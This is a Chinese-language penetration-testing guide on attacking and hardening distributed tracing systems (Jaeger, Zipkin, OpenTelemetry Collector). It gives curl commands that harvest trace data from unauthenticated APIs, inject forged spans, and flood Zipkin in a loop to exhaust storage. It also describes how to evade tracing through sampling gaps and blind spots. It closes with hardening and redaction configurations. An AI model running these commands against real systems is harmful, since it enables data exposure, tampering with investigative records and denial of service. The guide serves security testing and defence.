# 分布式追踪安全测试 (Distributed Tracing Security Testing)

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供分布式追踪系统的安全测试方法论，帮助测试人员评估 Jaeger、Zipkin 等追踪系统的安全性。

### 1.2 适用范围
本文档适用于以下场景：
- Jaeger 追踪系统安全测试
- Zipkin 追踪系统安全测试
- OpenTelemetry  Collector 安全评估
- 微服务追踪数据完整性验证

### 1.3 读者对象
- 渗透测试工程师
- 微服务安全分析师
- SRE 工程师
- 云原生安全架构师

---

## 第二部分：核心渗透技术专题

### 2.1 技术介绍

分布式追踪系统用于跟踪微服务架构中的请求流转。安全测试关注追踪数据的敏感性、追踪系统的访问控制和追踪注入攻击等问题。

**核心原理：**
- **追踪数据泄露**：追踪数据可能包含敏感业务逻辑和用户信息
- **无认证访问**：追踪 UI 和 API 通常无认证
- **追踪注入攻击**：攻击者可注入恶意追踪数据
- **Span 数据篡改**：可篡改追踪 span 误导调查

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **Jaeger UI** | 追踪查询界面 | 无认证访问追踪数据 |
| **Zipkin API** | 追踪数据 API | 未授权查询和注入 |
| **OpenTelemetry Collector** | 追踪数据收集 | 配置泄露、注入 |
| **服务网格追踪** | Istio 追踪 | 追踪数据包含敏感信息 |
| **A PM 集成** | 与 APM 工具集成 | 凭证泄露 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**Jaeger 探测：**
```bash
# 检测 Jaeger UI
curl http://target:16686/

# 查询服务列表
curl http://target:16686/api/services

# 查询追踪
curl "http://target:16686/api/traces?service=api&limit=100"

# 查询特定追踪
curl http://target:16686/api/traces/<trace_id>

# 检查依赖关系
curl http://target:16686/api/dependencies
```

**Zipkin 探测：**
```bash
# 检测 Zipkin UI
curl http://target:9411/

# 查询服务列表
curl http://target:9411/api/v2/services

# 查询追踪
curl "http://target:9411/api/v2/traces?serviceName=api&limit=10"

# 查询 span 名称
curl http://target:9411/api/v2/spans?serviceName=api
```

**OpenTelemetry Collector 探测：**
```bash
# Collector 通常监听 4317 (gRPC) 和 4318 (HTTP)
# 检查端点
curl http://target:4318/v1/traces

# 检查健康状态
curl http://target:13133/health
```

#### 2.3.2 白盒测试

**追踪配置审计：**
```yaml
# OpenTelemetry Collector 配置示例
# 危险配置：无认证接收追踪
receivers:
  otlp:
    protocols:
      http:
        endpoint: 0.0.0.0:4318  # 危险：绑定所有接口

# 危险：处理敏感数据
processors:
  batch:
    # 无敏感数据过滤

# 危险：导出到不安全端点
exporters:
  logging:
    verbosity: detailed  # 记录所有数据
```

```java
// 代码审计：追踪数据包含敏感信息
// 危险模式
Span span = tracer.spanBuilder("processPayment")
    .setAttribute("credit_card", creditCardNumber)  // 危险
    .startSpan();

// 正确模式
Span span = tracer.spanBuilder("processPayment")
    .setAttribute("payment_id", paymentId)  // 脱敏
    .startSpan();
```

### 2.4 漏洞利用方法

#### 2.4.1 追踪数据泄露

```bash
# 查询所有服务的追踪
curl http://target:16686/api/services | jq '.data[]'

# 查询最近所有追踪
curl "http://target:16686/api/traces?limit=1000"

# 搜索敏感操作
curl "http://target:16686/api/traces?service=payment&operation=processPayment"

# 提取敏感 span 数据
# 追踪数据可能包含：
# - 数据库查询
# - API 密钥
# - 用户 ID
# - 业务逻辑
```

#### 2.4.2 追踪注入攻击

```bash
# 向追踪系统注入虚假数据
# 使用 OpenTelemetry SDK 或直接向 API 发送

# 向 Zipkin 注入追踪
curl -X POST http://target:9411/api/v2/spans \
  -H "Content-Type: application/json" \
  -d '[
    {
      "traceId": "fake_trace_id_12345678",
      "id": "fake_span_id_12345678",
      "name": "fakeOperation",
      "timestamp": 1704067200000000,
      "duration": 1000,
      "localService": {"serviceName": "legitimate-service"},
      "tags": {
        "status": "success",
        "fake_data": "injected"
      }
    }
  ]'
```

**追踪洪水攻击：**
```bash
# 发送大量追踪数据淹没系统
for i in {1..10000}; do
  curl -X POST http://target:9411/api/v2/spans \
    -H "Content-Type: application/json" \
    -d "[{\"traceId\":\"$RANDOM\",\"id\":\"$RANDOM\",\"name\":\"flood\"}]"
done

# 可能导致：
# 1. 存储耗尽
# 2. 查询性能下降
# 3. 真实追踪被覆盖
```

#### 2.4.3 追踪数据篡改

```bash
# 如果有写入权限
# 修改现有追踪（如果系统支持）

# 删除追踪（如果支持）
# 大多数追踪系统不支持删除，但可以：
# 1. 注入混淆数据
# 2. 覆盖旧数据
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过追踪采样

```bash
# 追踪系统通常有采样率
# 攻击者可：
# 1. 发送大量请求确保部分被追踪
# 2. 利用采样盲点（如特定时间窗口）

# 在低采样率下确保被追踪
for i in {1..1000}; do
  curl "http://target/api/sensitive"
done
# 即使 1% 采样率，也有 10 次被追踪
```

#### 2.5.2 利用追踪盲点

```bash
# 追踪系统可能不覆盖：
# 1. 异步操作
# 2. 后台任务
# 3. 定时任务
# 4. 外部服务调用

# 在这些盲点执行敏感操作
# 例如：通过消息队列异步处理
```

---

## 第三部分：附录

### 3.1 分布式追踪安全配置检查清单

| **组件** | **配置项** | **安全设置** |
| :--- | :--- | :--- |
| Jaeger | UI 认证 | 启用反向代理认证 |
| Jaeger | 网络暴露 | 限制内网访问 |
| Zipkin | API 访问 | 启用认证 |
| Collector | 数据接收 | 启用 TLS |
| Collector | 敏感数据 | 配置脱敏处理器 |

### 3.2 追踪数据脱敏配置

```yaml
# OpenTelemetry Collector 脱敏配置
processors:
  attributes:
    actions:
      - key: credit_card
        action: delete
      - key: password
        action: hash
      - key: api_key
        action: mask
        mask: "****"
```

### 3.3 参考资源

- [Jaeger Security](https://www.jaegertracing.io/docs/latest/security/)
- [OpenTelemetry Security](https://opentelemetry.io/docs/reference/specification/security/)
- [Zipkin Security Considerations](https://zipkin.io/pages/faq.html)
